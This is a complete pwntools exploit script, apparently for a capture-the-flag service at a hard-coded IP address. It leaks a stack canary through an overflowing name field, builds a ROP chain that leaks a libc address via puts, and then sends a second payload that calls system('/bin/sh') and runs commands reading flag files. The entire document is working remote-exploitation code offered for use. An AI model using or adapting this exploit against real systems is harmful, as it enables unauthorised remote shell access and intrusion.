from pwn import *
import sys, traceback

context.arch = 'amd64'
context.log_level = 'error'

PUTS_OFF = 0x82060
SYSTEM_OFF = 0x54790
BINSH_OFF = 0x1aaea4

def rx(io, pat, t=5, tag=''):
    try:
        d = io.recvuntil(pat, timeout=t)
        print(f'  OK {tag}: {d[-60:]!r}')
        return d
    except Exception as e:
        print(f'  ERR {tag} ({type(e).__name__}): {e}')
        try:
            print('  buf:', io.buffer + b'')
        except Exception:
            pass
        raise

def attempt(name, pop, ret, plt, got, loop):
    print(f'=== {name}: pop={hex(pop)} ret={hex(ret)} plt={hex(plt)} got={hex(got)} loop={hex(loop)}')
    io = remote('169.58.126.107', 5000, timeout=10)
    try:
        rx(io, b'Enter your name: ', tag='prompt1')
        io.send(b'A' * 73)
        rx(io, b'Hello, ' + b'A' * 73, tag='echo1')
        leak = rx(io, b'\nLeave a message', tag='leak')
        leak = leak[: -len(b'\nLeave a message')]
        print(f'  leak len={len(leak)} hex={leak.hex()}')
        if len(leak) < 7:
            print('  short leak, abort')
            io.close(); return None
        canary = b'\x00' + leak[:7]
        rbp = (leak[7:13] + b'\x00' * 8)[:8]
        rx(io, b'vault keeper: ', tag='prompt2')
        payload = b'A' * 72 + canary + rbp + p64(pop) + p64(got) + p64(ret) + p64(plt) + p64(loop)
        print(f'  payload len={len(payload)}')
        io.send(payload)
        rx(io, b'Message received.\n', t=6, tag='msgrecv')
        raw = rx(io, b'Enter your name: ', t=6, tag='prompt3')
        core = raw[: -len(b'Enter your name: ')]
        print(f'  between: {core!r} hex={core.hex()}')
        if b'\n' not in core:
            print('  no leak line'); io.close(); return None
        leaked = core.split(b'\n', 1)[0]
        puts_leak = u64(leaked.ljust(8, b'\x00'))
        base = puts_leak - PUTS_OFF
        print(f'  puts={hex(puts_leak)} base={hex(base)} page_off_ok={((puts_leak & 0xfff) == (PUTS_OFF & 0xfff))}')
        if (puts_leak & 0xfff) != (PUTS_OFF & 0xfff):
            io.close(); return None
        io.send(b'A' * 73)
        rx(io, b'Hello, ' + b'A' * 73, tag='echo2')
        leak2 = rx(io, b'\nLeave a message', tag='leak2')
        leak2 = leak2[: -len(b'\nLeave a message')]
        if len(leak2) < 7:
            print('  short leak2'); io.close(); return None
        canary2 = b'\x00' + leak2[:7]
        rbp2 = (leak2[7:13] + b'\x00' * 8)[:8]
        rx(io, b'vault keeper: ', tag='prompt4')
        payload2 = b'A' * 72 + canary2 + rbp2 + p64(ret) + p64(pop) + p64(base + BINSH_OFF) + p64(base + SYSTEM_OFF)
        io.send(payload2)
        rx(io, b'Message received.\n', t=6, tag='msgrecv2')
        io.send(b'echo SHELL_OK; cat /flag /flag.txt /root/flag 2>/dev/null; ls /; echo ENDFLAG\n')
        out = io.recvall(timeout=6)
        print(f'  SHELL OUT: {out!r}')
        io.close()
        return out
    except Exception:
        traceback.print_exc(limit=1)
        try: io.close()
        except Exception: pass
        return None

if __name__ == '__main__':
    which = sys.argv[1] if len(sys.argv) > 1 else 'A'
    combos = {
        'A': ('A', 0x401205, 0x401208, 0x401030, 0x403fc8, 0x4013c9),
        'B': ('B', 0x4012cd, 0x4012d0, 0x401030, 0x403fc8, 0x4013c9),
    }
    attempt(*combos[which])
